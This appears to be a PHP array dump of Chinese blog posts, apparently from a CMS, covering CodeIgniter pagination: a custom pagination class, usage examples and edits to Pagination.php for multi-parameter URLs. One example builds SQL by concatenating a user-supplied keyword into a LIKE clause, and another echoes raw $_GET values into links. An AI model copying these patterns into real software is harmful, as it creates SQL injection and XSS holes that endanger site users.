$this-&gt;first_url=&nbsp;rtrim((($this-&gt;first_url&nbsp;==&nbsp;&#39;&#39;)&nbsp;?&nbsp;$this-&gt;base_url&nbsp;:&nbsp;$this-&gt;first_url),&nbsp;&#39;/&#39;).$this-&gt;suffix;</pre><pre>更新CI3.0&nbsp;在556行之后添加此内容，注意$CI-&gt;config-&gt;item(&#39;url_suffix&#39;);已改为$this-&gt;CI-&gt;config-&gt;item(&#39;url_suffix&#39;);。然后分别在566、580、612行中的$first_url替换为&nbsp;$this-&gt;first_url</pre><p>这样就能避免出现以上两种情况。</p><p><strong>注意</strong>：使用分页类时，配置参数$config[‘base_url’] 使用 base_url();而不用site_url();</p><p><strong>附赠</strong>：</p><pre>$Str[&#39;count_page&#39;]&nbsp;=&nbsp;ceil($total&nbsp;/&nbsp;$limit);//总页数
$Str[&#39;this_page&#39;]&nbsp;=&nbsp;$offset&nbsp;/&nbsp;$limit&nbsp;+&nbsp;1;//当前页</pre><p><br/></p><p>文章转自：http://www.vifoe.com/ci%E8%AE%BE%E7%BD%AE%E4%BC%AA%E9%9D%99%E6%80%81%E5%AF%B9%E5%88%86%E9%A1%B5%E7%B1%BB%E4%B8%8D%E9%80%82%E7%94%A8%E5%8F%8A%E5%88%86%E9%A1%B5%E7%B1%BB%E9%93%BE%E6%8E%A5%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84/</p>',
            'keyword' => 'CI,伪静态,分页',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:21:00',
          ),
          6 => 
          array (
            'id' => '79',
            'uid' => '1',
            'title' => 'CodeIgniter 的分页类调用并处理多参数',
            'content' => '<p>ci分页扩展类：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
if&nbsp;(!defined(&#39;BASEPATH&#39;))&nbsp;exit(&#39;No&nbsp;direct&nbsp;script&nbsp;access&nbsp;allowed&#39;);
/**
&nbsp;*&nbsp;分页类&nbsp;初始化与控制
&nbsp;*&nbsp;@author&nbsp;WangYongDong
&nbsp;*/
class&nbsp;Page&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;static&nbsp;function&nbsp;loadPage($iCount,$iPageSize,$sUrl)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//加载分页类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CI&nbsp;=&nbsp;&amp;&nbsp;get_instance();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CI-&gt;load-&gt;library(&#39;pagination&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;base_url&#39;]&nbsp;=&nbsp;base_url().$sUrl;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;total_rows&#39;]&nbsp;=&nbsp;$iCount;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//总条数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;per_page&#39;]&nbsp;=&nbsp;$iPageSize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//每页条数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;num_links&#39;]&nbsp;=&nbsp;2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//定义当前页的前后各有几个数字链接
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;use_page_numbers&#39;]&nbsp;=&nbsp;TRUE;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//显示当前页码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;first_link&#39;]&nbsp;=&nbsp;&#39;首页&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;last_link&#39;]&nbsp;=&nbsp;&#39;末页&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;next_link&#39;]&nbsp;=&nbsp;&#39;下一页&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;下一页显示
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;prev_link&#39;]&nbsp;=&nbsp;&#39;上一页&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;上一页显示
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;full_tag_open&#39;]&nbsp;=&nbsp;&#39;&lt;p&nbsp;class=&quot;page-bor&quot;&gt;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;//把打开的标签放在所有结果的左侧。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;full_tag_close&#39;]&nbsp;=&nbsp;&#39;&lt;/p&gt;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把关闭的标签放在所有结果的右侧。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;first_tag_open&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“第一页”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;first_tag_close&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;//“第一页”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;last_tag_open&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“最后一页”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;last_tag_close&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“最后一页”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;next_tag_open&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“下一页”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;next_tag_close&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“下一页”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;prev_tag_open&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“上一页”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;prev_tag_close&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“上一页”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;cur_tag_open&#39;]&nbsp;=&nbsp;&#39;&lt;a&nbsp;class=&quot;page-othor&nbsp;current&quot;&gt;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;//“当前页”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;cur_tag_close&#39;]&nbsp;=&nbsp;&#39;&lt;/a&gt;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“当前页”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;num_tag_open&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“数字”链接的打开标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;num_tag_close&#39;]&nbsp;=&nbsp;&#39;&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//“数字”链接的关闭标签。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;anchor_class&#39;]&nbsp;=&nbsp;&quot;class=&#39;page-othor&#39;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//给链接添加&nbsp;CSS&nbsp;类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;page_query_string&#39;]&nbsp;=&nbsp;TRUE;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//以?id=3&amp;name=4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;query_string_segment&#39;]&nbsp;=&nbsp;&#39;page&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//设置分页参数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CI-&gt;pagination-&gt;initialize($config);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//执行分页方法
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;static&nbsp;function&nbsp;getParam($iPageSize,$pageId)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pagenum&nbsp;=&nbsp;$iPageSize;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageId&nbsp;=&nbsp;$pageId&nbsp;?&nbsp;$pageId&nbsp;:&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$start&nbsp;=&nbsp;($pageId&nbsp;-&nbsp;1)&nbsp;*&nbsp;$pagenum;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[&#39;start&#39;]&nbsp;=&nbsp;$start;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[&#39;pagenum&#39;]&nbsp;=&nbsp;$pagenum;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$arr;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
}</pre><p>分页调用函数：</p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;调用分页类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getPage($sTable,$sUrl,$pageId,$iPageNum=10,$sFilter=&#39;&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//调用page类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;page&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$iCount&nbsp;=&nbsp;getPageCount($sTable,$sFilter);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$iPageSize&nbsp;=&nbsp;$iPageNum;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;page-&gt;loadPage($iCount,$iPageSize,$sUrl);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//总页数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$num_pages&nbsp;=&nbsp;ceil($iCount/$iPageSize);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($pageId&gt;$num_pages)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageId&nbsp;=&nbsp;$num_pages;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($pageId&lt;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageId&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr&nbsp;=&nbsp;$this-&gt;page-&gt;getParam($iPageSize,$pageId);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$arr;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>调用实例：</p><pre class=\\"brush:php;toolbar:false\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//分页执行，无多余参数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageId&nbsp;=&nbsp;$this-&gt;input-&gt;get(&#39;page&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr&nbsp;=&nbsp;$this-&gt;public_model-&gt;getPage(&quot;links&quot;,&#39;links?&#39;,$pageId);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;list&#39;]&nbsp;=&nbsp;$this-&gt;links_model-&gt;getLinksList($arr[&#39;start&#39;],$arr[&#39;pagenum&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//分页执行，有其他参数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//分页执行
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageId&nbsp;=&nbsp;$this-&gt;input-&gt;get(&#39;page&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sFilter&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!empty($data[&#39;aFilter&#39;][&#39;keyword&#39;]))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sFilter&nbsp;=&nbsp;&#39;&nbsp;AND&nbsp;title&nbsp;LIKE&quot;%&#39;.$data[&#39;aFilter&#39;][&#39;keyword&#39;].&#39;%&quot;&nbsp;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr&nbsp;=&nbsp;$this-&gt;public_model-&gt;getPage(&quot;article&quot;,&#39;article?&#39;,$pageId,$sFilter);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;list&#39;]&nbsp;=&nbsp;$this-&gt;article_model-&gt;getArticleList($arr[&#39;start&#39;],$arr[&#39;pagenum&#39;],$data[&#39;aFilter&#39;]);</pre><p><br/></p>',
            'keyword' => 'CodeIgniter,分页,参数',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:18:34',
          ),
          7 => 
          array (
            'id' => '78',
            'uid' => '1',
            'title' => 'URL带有其他参数时，如何使用PHP的CI框架分页类？',
            'content' => '<p>最近在学习用php的CI框架写一个自己的CMS，遇到了些问题。</p><p>其中一个就是CI分页的时候，我的URL带有其他参数，才能查出我想要的数据。于是我翻遍了谷歌度娘，终于找到了解决办法，和我想的差不多，就贴出了和大家分享下。</p><p>首先，设置你的base_url，$block，create_id，has_pass，pass_id为我的查询条件，表单提交GET方式，根据条件的有无，修改base_url和查询条件</p><pre class=\\"brush:php;toolbar:false\\">$config[&#39;base_url&#39;]&nbsp;=&nbsp;&nbsp;base_url().&quot;index.php/admin/article/manage?&quot;;&nbsp;&nbsp;
　　if(!empty($_GET[&#39;block&#39;])){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;where(&#39;class_id&#39;,&nbsp;$_GET[&#39;block&#39;]);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;base_url&#39;].=&quot;&amp;block=&quot;.$_GET[&#39;block&#39;];&lt;br&gt;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;if(!empty($_GET[&#39;create_id&#39;])){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;where(&#39;create_id&#39;,&nbsp;$_GET[&#39;create_id&#39;]);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;base_url&#39;].=&quot;&amp;create_id=&quot;.$_GET[&#39;create_id&#39;];&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;if(!empty($_GET[&#39;has_pass&#39;])){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;where(&#39;has_pass&#39;,&nbsp;$_GET[&#39;has_pass&#39;]);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;base_url&#39;].=&quot;&amp;has_pass=&quot;.$_GET[&#39;has_pass&#39;];&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;if(!empty($_GET[&#39;pass_id&#39;])){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;　　$this-&gt;db-&gt;where(&#39;pass_id&#39;,&nbsp;$_GET[&#39;pass_id&#39;]);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;　　$config[&#39;base_url&#39;].=&quot;&amp;pass_id=&quot;.$_GET[&#39;pass_id&#39;];&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;}</pre><p>然后开启page_query_string</p><pre class=\\"brush:php;toolbar:false\\">$config[&#39;page_query_string&#39;]&nbsp;=&nbsp;TRUE;</pre><p>最后出现的URL是这样的</p><p>http:<span class=\\"comment\\">//localhost/lycms/index.php/admin/article/manage?&amp;block=8&amp;create_id=0&amp;has_pass=1&amp;pagenow=2</span></p><p><span class=\\"comment\\"><br/></span></p><p><span class=\\"comment\\"></span></p><p>&amp;per_page=2是开启page_query_string后，自动在url后追加的。</p><p>OK，就这样搞定了。</p><p>还有的同学想在CI输出分页链接的时候加上&quot;共X条记录 N/X页&quot;等字样，其实很简单，只要在CI分页类的文件system\\\\libraries\\\\Pagination.php 里添加如下代码即可</p><pre class=\\"brush:php;toolbar:false\\">$output&nbsp;=&nbsp;&#39;共&#39;.$this-&gt;total_rows.&#39;条记录&nbsp;&nbsp;&#39;.$this-&gt;cur_page&nbsp;.&#39;/&#39;.$num_pages.&#39;页&nbsp;&#39;;</pre><p>好吧，就这样</p><p><span class=\\"comment\\"></span> <br/><br/></p>',
            'keyword' => 'ci,框架,分页',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:13:56',
          ),
          8 => 
          array (
            'id' => '77',
            'uid' => '1',
            'title' => 'CodeIgniter分页类对多参数传递时的灵活处理',
            'content' => '<p>Codeigniter的分页类总体是很方便的，但其使用时有一定的限制，如点击页面跳转按钮的时候,按默认的url方式,必须是这样的格式<br/>http://example.com/index.php/控制器/方法名/页面的偏移值<br/><br/>页面的偏移值必须是方法名后第一个参数，否者分页类不能判断当前是哪一页，而用ci的分页类进行页面跳转时它是把偏移值加在base_url的最后面。这时如果我在点击页面跳转按钮进行页面跳转时还想带参数呢，像下面这样的话分页类就不能正常工作了。<br/><br/>http://example.com/index.php/控制器/方法名/其它参数1/其它参数2/页面的偏移值<br/><br/>网上查找多处文档，一般的解决方法如下：<br/><br/><span style=\\"color:#990030\\">解决方法，在config.php配置文件中把
$config[&#39;enable_query_strings&#39;] 设置为 TRUE,传给分页类的config配置数组中也要加一个设置
$config[&#39;page_query_string&#39;] = TRUE; 然后我们就能以这查询字符串的方式来跳转页面了。<br/>http://example.com/index.php?c=test&amp;m=page&amp;d1=222&amp;d2=3333&amp;per_page=20<br/><br/>其中的d1和d2是要传给控制器的别的参数。我们获取这两个参数可以用输入类里的
$this-&gt;input-&gt;get(&#39;d1&#39;);<br/></span><br/>经测试使用，不太成功，这种方法并不理想，并且在网站中部分URL使用不同的展现方式总是觉得很别扭，经本人摸索测试，可以使用以下简洁的方法实现之：<br/><br/><span style=\\"color:#22B14C\\"><span style=\\"color:#006600\\">经检查Pagination.php的源代码，发现其有很多
参数一般情况下都是未用的，并且其意义就表示可以处理各种特殊问题，其中suffix的变量引起本人注意，经浏览代码，它的意思是在每个链接的后面再增加
给定的内容，看到这里，灵机一动，那我们可以将页号放在分页正常需要的第3个位置，而将其他参数通过这个suffix加入链接不就行了吗？<br/>　　立刻测试，假定参照上述要求，则将test类中的page方法的变量次序调整一下，即：<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>public function page($page=1,$d1=&#39;111&#39;,$d2=&#39;111&#39;) {<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>....<br/>　　　&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>$config[&#39;suffix&#39;] = &#39;/222/333&#39; ;<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>...<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>$this-&gt;pagination-&gt;initialize($config);<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>$data[&#39;page_links&#39;] =
$this-&gt;pagination-&gt;create_links();<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>...<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>}<br/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>存盘后，F5看结果，Cool！一次性成功！<br/><br/><span style=\\"color:#006600\\"><span style=\\"color:#006600\\">经<span style=\\"color:#006600\\">实际<span style=\\"color:#006600\\">使用，还发现一个小Bug，<span style=\\"color:#006600\\">即数字1的链接总是会<span style=\\"color:#006600\\">链接不正常，经检查其源代码，是</span></span></span></span></span></span></span></span><span style=\\"color:#22B14C\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#22B14C\\"><span style=\\"color:#006600\\">Pagination.php自作聪明地将第一<span style=\\"color:#006600\\">页认为总是不必加分页<span style=\\"color:#006600\\">号，这样，我们设定的参数顺序就会受到影响，导致结果不正常，知道原因后则处理方式</span></span></span></span></span></span></span></span></span></span>也很简单<span style=\\"color:#006600\\"><span style=\\"color:#006600\\">，</span><span style=\\"color:#006600\\">再给</span>第1页传一个参数，这<span style=\\"color:#006600\\">个参数其实</span></span></span></span><span style=\\"color:#22B14C\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#006600\\"><span style=\\"color:#22B14C\\"><span style=\\"color:#006600\\">Pagination.php中也是使用的first_url<span style=\\"color:#006600\\">,<span style=\\"color:#006600\\">如下：<br/><span style=\\"color:#006600\\"><span style=\\"color:#006600\\">&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/>&nbsp;<wbr/><span style=\\"color:#006600\\">$config[&#39;first_url&#39;] = <span style=\\"color:#006600\\">&#39;<span style=\\"color:#006600\\">/test/page/1/222/333&#39; ;</span></span></span></span></span></span></span></span></span></span></span></span></span></p>',
            'keyword' => 'CodeIgniter,分页,参数,传递,ci,框架',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:12:30',
          ),
          9 => 
          array (
            'id' => '76',
            'uid' => '1',
            'title' => 'ueditor使用配置总结',
